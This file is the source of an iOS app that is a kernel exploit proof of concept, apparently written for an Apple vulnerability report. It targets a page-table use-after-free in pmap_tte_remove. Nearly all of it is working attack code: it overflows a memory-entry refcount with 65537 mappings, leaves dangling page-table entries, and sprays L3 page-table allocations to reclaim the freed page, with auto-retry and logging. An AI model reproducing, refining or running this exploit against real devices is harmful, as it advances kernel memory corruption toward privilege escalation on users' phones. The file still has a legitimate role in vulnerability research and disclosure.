/*
 * poc_v17_pmap_spray.m — pmap_tte_remove PUAF → L3 page table heap spray
 * AndromedaPmap v17
 *
 * Apple ticket: OE1105320204625 — HOLD until check-in 2026-04-25
 *
 * v16 miss reason: VM_FLAGS_ANYWHERE allocations cluster in same VA range,
 * reusing existing L3 tables — pmap_pages_alloc never called.
 *
 * v17 fix: allocate at hinted VAs spaced 32MB apart (one L3 covers 32MB on
 * ARM64 with 16KB pages: 2048 entries × 16KB = 32MB). Each allocation lands
 * in a new 32MB window, forcing pmap_tt_allocate → pmap_pages_alloc for a
 * new L3 table every single spray iteration.
 *
 * v17 also: auto-retry on miss (up to MAX_RETRY), persistent log across runs.
 */

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <time.h>

extern kern_return_t mach_vm_allocate(vm_map_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

/* ─── Constants ─── */
#define OVERFLOW      65537
#define KEEP          64
#define PAGE_SZ       16384
#define ALLOC_SZ      PAGE_SZ
#define SENTINEL      0x41
#define MAGIC_U32     0xDEA1DEADu
#define SPRAY_COUNT   1024
#define L3_SPAN       (32ULL * 1024 * 1024)   /* 32MB per L3 table on ARM64/16KB */
#define SPRAY_BASE    0x400000000ULL           /* start hint: 16GB VA — well above heap */
#define MAX_RETRY     50

/* ─── Globals ─── */
static NSMutableString *gFullLog;    /* persists across all runs */
static NSMutableString *gRunLog;     /* current run only */
static sigjmp_buf       g_jmpbuf;
static volatile int     g_faulted;
static int              g_runCount   = 0;
static int              g_hitCount   = 0;

static void LOG(NSString *fmt, ...) {
    va_list args; va_start(args, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    [gRunLog  appendFormat:@"%@\n", s];
    [gFullLog appendFormat:@"%@\n", s];
    NSLog(@"%@", s);
}

/* ─── Mach helpers ─── */
static mach_vm_address_t alloc_backing_page(void) {
    mach_vm_address_t a = 0;
    if (mach_vm_allocate(mach_task_self(), &a, ALLOC_SZ, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) return 0;
    memset((void *)a, SENTINEL, ALLOC_SZ);
    return a;
}
static kern_return_t make_entry(mach_vm_address_t b, mach_port_t *o) {
    mach_vm_size_t sz = ALLOC_SZ;
    return mach_make_memory_entry_64(mach_task_self(), &sz, (mach_vm_offset_t)b,
        VM_PROT_READ|VM_PROT_WRITE, o, MACH_PORT_NULL);
}
static kern_return_t map_entry(mach_port_t p, mach_vm_address_t *o) {
    *o = 0;
    return mach_vm_map(mach_task_self(), o, ALLOC_SZ, 0, VM_FLAGS_ANYWHERE, p, 0,
        FALSE, VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE, VM_INHERIT_NONE);
}

/* ─── Signal handler ─── */
static void fault_handler(int sig) { g_faulted = 1; siglongjmp(g_jmpbuf, 1); }
static int safe_read32(volatile void *addr, uint32_t *out) {
    g_faulted = 0;
    if (sigsetjmp(g_jmpbuf, 1) == 0) { *out = *(volatile uint32_t *)addr; return 1; }
    return 0;
}

/* ─── Core spray run ─── Returns number of faults (hits). */
static int do_spray_run(int runIdx) {
    kern_return_t kr;
    LOG(@"── Run %d ─────────────────────────────────────────────", runIdx);

    /* Phase 1: PUAF */
    mach_vm_address_t backing = alloc_backing_page();
    if (!backing) { LOG(@"[-] alloc_backing_page failed"); return -1; }

    mach_port_t entry_port = MACH_PORT_NULL;
    if (make_entry(backing, &entry_port) != KERN_SUCCESS) {
        LOG(@"[-] make_entry failed"); return -1;
    }

    mach_vm_address_t *maps = (mach_vm_address_t *)calloc(OVERFLOW, sizeof(mach_vm_address_t));
    if (!maps) { LOG(@"[-] calloc maps"); return -1; }

    int created = 0;
    for (int i = 0; i < OVERFLOW; i++) {
        if (map_entry(entry_port, &maps[i]) != KERN_SUCCESS) break;
        created++;
    }
    LOG(@"  OVERFLOW: %d maps → refcount wrapped to %d", created, created % 65536);

    int to_free = created - KEEP;
    for (int i = created - 1; i >= KEEP; i--)
        mach_vm_deallocate(mach_task_self(), maps[i], ALLOC_SZ);
    LOG(@"  PUAF: L3 freed (pmap_free_pt_delayed). %d dangling PTEs.", KEEP);

    /* Phase 2: baseline write-through */
    int wt = 0;
    for (int i = 0; i < KEEP; i++) {
        volatile uint8_t *p = (volatile uint8_t *)maps[i];
        *p = 0xBB;
        wt += (*p == 0xBB) ? 1 : 0;
    }
    LOG(@"  Write-through: %d/%d  (baseline)", wt, KEEP);

    /* Phase 3: fill freed L3 page with 0xDEA1DEAD */
    volatile uint32_t *freepage = (volatile uint32_t *)maps[0];
    for (int off = 0; off < (int)(PAGE_SZ / 4); off++) freepage[off] = MAGIC_U32;
    uint32_t check = 0;
    int read_ok = safe_read32((volatile void *)maps[0], &check);
    LOG(@"  Mark: 0xDEA1DEAD × 4096 slots  baseline-read=%s",
        read_ok ? (check == MAGIC_U32 ? "0xDEA1DEAD ✓" : "UNEXPECTED") : "FAULT");

    /* Phase 4: SPRAY — 32MB-spaced hints so each forces a new L3 table */
    mach_vm_address_t *spray = (mach_vm_address_t *)calloc(SPRAY_COUNT, sizeof(mach_vm_address_t));
    if (!spray) { LOG(@"[-] calloc spray"); free(maps); return -1; }

    int sprayed = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        /*
         * Hint: SPRAY_BASE + i × 32MB
         * Each 32MB window has its own L3 table. Hinting here forces the kernel
         * to allocate a NEW L3 table for this window → pmap_pages_alloc called.
         * If our freed L3 page is at the HEAD of pmap_pages_free_list, it will
         * be the first new L3 table reused.
         */
        mach_vm_address_t hint = SPRAY_BASE + (mach_vm_address_t)i * L3_SPAN;
        mach_vm_address_t sa   = hint;
        kr = mach_vm_map(mach_task_self(), &sa, PAGE_SZ, 0,
                         VM_FLAGS_ANYWHERE,   /* kernel may adjust — that's OK */
                         MACH_PORT_NULL, 0, FALSE,
                         VM_PROT_READ|VM_PROT_WRITE,
                         VM_PROT_READ|VM_PROT_WRITE,
                         VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) continue;
        /* Touch → page fault → pmap_enter → L3 alloc if new window */
        *(volatile uint8_t *)sa = 0xAB;
        spray[i] = sa;
        sprayed++;
    }
    LOG(@"  Spray: %d/%d allocations (32MB-spaced hints → new L3 per slot)", sprayed, SPRAY_COUNT);

    /* Phase 5: probe */
    int faults = 0, ok_same = 0, ok_diff = 0;
    for (int i = 0; i < KEEP; i++) {
        uint32_t val = 0;
        if (!safe_read32((volatile void *)maps[i], &val)) {
            faults++;
        } else if (val == MAGIC_U32) {
            ok_same++;
        } else {
            ok_diff++;
        }
    }
    LOG(@"  Probe: faults=%d  unchanged=%d  changed=%d", faults, ok_same, ok_diff);

    /* Result for this run */
    if (faults > 0) {
        LOG(@"");
        LOG(@"  ★★★ UAF REUSE CONFIRMED — %d Translation Fault(s) ★★★", faults);
        LOG(@"  Freed L3 page reallocated as live kernel L3 table.");
        LOG(@"  0xDEA1DEAD in reused page → invalid ARM64 PTE → Translation Fault.");
        LOG(@"  pmap_tte_remove = exploitable kernel UAF, NOT local DoS.");
    } else {
        LOG(@"  Spray miss. Freed page not yet reclaimed. (Run %d)", runIdx);
    }

    /* Cleanup */
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray[i]) mach_vm_deallocate(mach_task_self(), spray[i], PAGE_SZ);
    free(spray);
    if (faults == 0)
        for (int i = 0; i < KEEP; i++)
            mach_vm_deallocate(mach_task_self(), maps[i], ALLOC_SZ);
    free(maps);
    mach_port_deallocate(mach_task_self(), entry_port);
    mach_vm_deallocate(mach_task_self(), backing, ALLOC_SZ);

    return faults;
}

/* ─── ViewController ─── */
@interface SprayVC : UIViewController
@property (nonatomic, strong) UITextView  *tv;
@property (nonatomic, strong) UILabel     *statusLabel;
@property (nonatomic, strong) UIButton    *runBtn;
@property (nonatomic, assign) BOOL         running;
@end

@implementation SprayVC

- (void)viewDidLoad {
    [super viewDidLoad];
    gFullLog = [NSMutableString string];
    gRunLog  = [NSMutableString string];

    self.view.backgroundColor = [UIColor colorWithRed:0.04 green:0.04 blue:0.06 alpha:1];

    /* Title */
    UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(0, 50, self.view.bounds.size.width, 28)];
    title.text = @"ANDROMEDA · pmap v17 · OE1105320204625";
    title.textAlignment = NSTextAlignmentCenter;
    title.textColor = [UIColor colorWithRed:0.4 green:0.8 blue:1 alpha:1];
    title.font = [UIFont boldSystemFontOfSize:11];
    title.autoresizingMask = UIViewAutoresizingFlexibleWidth;
    [self.view addSubview:title];

    /* Status badge */
    self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 80, self.view.bounds.size.width, 22)];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.textColor = [UIColor colorWithWhite:0.5 alpha:1];
    self.statusLabel.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.statusLabel.autoresizingMask = UIViewAutoresizingFlexibleWidth;
    self.statusLabel.text = @"idle — tap RUN to begin auto-retry";
    [self.view addSubview:self.statusLabel];

    /* Log text view */
    CGFloat tvTop = 108;
    CGFloat btnH  = 52;
    self.tv = [[UITextView alloc] initWithFrame:
        CGRectMake(0, tvTop, self.view.bounds.size.width,
                   self.view.bounds.size.height - tvTop - btnH - 16)];
    self.tv.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    self.tv.backgroundColor  = [UIColor colorWithRed:0.02 green:0.02 blue:0.04 alpha:1];
    self.tv.textColor        = [UIColor colorWithRed:0.2 green:0.9 blue:0.4 alpha:1];
    self.tv.font             = [UIFont fontWithName:@"Menlo-Regular" size:9.5];
    self.tv.editable         = NO;
    self.tv.layer.cornerRadius = 8;
    [self.view addSubview:self.tv];

    /* Run button */
    self.runBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    self.runBtn.frame = CGRectMake(20,
        self.view.bounds.size.height - btnH - 8,
        self.view.bounds.size.width - 40, btnH);
    self.runBtn.autoresizingMask = UIViewAutoresizingFlexibleTopMargin | UIViewAutoresizingFlexibleWidth;
    self.runBtn.backgroundColor = [UIColor colorWithRed:0.8 green:0.1 blue:0.1 alpha:1];
    self.runBtn.layer.cornerRadius = 10;
    [self.runBtn setTitle:@"RUN AUTO-RETRY" forState:UIControlStateNormal];
    [self.runBtn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.runBtn.titleLabel.font = [UIFont boldSystemFontOfSize:16];
    [self.runBtn addTarget:self action:@selector(tapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.runBtn];

    /* Signal handlers */
    struct sigaction sa; memset(&sa, 0, sizeof(sa));
    sa.sa_handler = fault_handler; sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL); sigaction(SIGBUS, &sa, NULL);

    [self appendLog:@"PmapHeapSpray v17 — auto-retry, 32MB-spaced spray\n"
                    @"OE1105320204625 — HOLD until 2026-04-25\n"
                    @"──────────────────────────────────────────\n"
                    @"Tap RUN AUTO-RETRY to start.\n"];
}

- (void)appendLog:(NSString *)s {
    [gFullLog appendString:s];
    dispatch_async(dispatch_get_main_queue(), ^{
        self.tv.text = gFullLog;
        [self.tv scrollRangeToVisible:NSMakeRange(gFullLog.length > 0 ? gFullLog.length - 1 : 0, 1)];
    });
}

- (void)setStatus:(NSString *)s color:(UIColor *)c {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.statusLabel.text  = s;
        self.statusLabel.textColor = c;
    });
}

- (void)tapped {
    if (self.running) return;
    self.running = YES;
    [self.runBtn setTitle:@"RUNNING…" forState:UIControlStateNormal];
    self.runBtn.backgroundColor = [UIColor colorWithRed:0.3 green:0.3 blue:0.3 alpha:1];
    dispatch_async(dispatch_get_global_queue(0, 0), ^{ [self runLoop]; });
}

- (void)runLoop {
    [self appendLog:@"\n══ AUTO-RETRY STARTED ══════════════════════════════\n"];
    [self setStatus:@"running…" color:[UIColor yellowColor]];

    int totalHits = 0;

    for (int attempt = 1; attempt <= MAX_RETRY; attempt++) {
        g_runCount++;
        gRunLog = [NSMutableString string];

        [self setStatus:[NSString stringWithFormat:@"attempt %d/%d — total hits: %d",
                         attempt, MAX_RETRY, g_hitCount]
                  color:[UIColor colorWithRed:1 green:0.7 blue:0.1 alpha:1]];

        int faults = do_spray_run(attempt);

        /* Flush this run's log to the persistent view */
        dispatch_sync(dispatch_get_main_queue(), ^{
            [gFullLog appendString:gRunLog];
            [gFullLog appendString:@"\n"];
            self.tv.text = gFullLog;
            [self.tv scrollRangeToVisible:NSMakeRange(gFullLog.length > 0 ? gFullLog.length-1 : 0, 1)];
        });

        if (faults > 0) {
            totalHits += faults;
            g_hitCount++;
            [self setStatus:[NSString stringWithFormat:@"★ HIT on attempt %d! faults=%d",
                             attempt, faults]
                      color:[UIColor colorWithRed:0.1 green:1 blue:0.3 alpha:1]];

            /* Save log on hit */
            [self saveLog];
            break;   /* stop retrying — we have proof */
        }

        /* Small yield between attempts */
        usleep(200000);
    }

    if (totalHits == 0) {
        [self appendLog:@"\n══ AUTO-RETRY EXHAUSTED — no hit in 20 runs ══\n"
                        @"  Freed page may be reclaimed by non-pmap allocator on this device.\n"
                        @"  Write-through (v14) baseline still valid — 64/64 each run.\n"];
        [self setStatus:[NSString stringWithFormat:@"miss ×%d — write-through still 64/64", MAX_RETRY]
                  color:[UIColor colorWithRed:1 green:0.4 blue:0.4 alpha:1]];
    }

    [self saveLog];

    dispatch_async(dispatch_get_main_queue(), ^{
        self.running = NO;
        [self.runBtn setTitle:@"RUN AUTO-RETRY" forState:UIControlStateNormal];
        self.runBtn.backgroundColor = [UIColor colorWithRed:0.8 green:0.1 blue:0.1 alpha:1];
    });
}

- (void)saveLog {
    NSArray  *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [[docs firstObject] stringByAppendingPathComponent:@"pmap_spray_v17.txt"];
    NSError  *err  = nil;
    [gFullLog writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:&err];
    if (!err) [self appendLog:[NSString stringWithFormat:@"[log saved: %@]\n", path]];
}

@end

/* ─── AppDelegate ─── */
@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.rootViewController = [SprayVC new];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, @"AppDelegate"); }
}
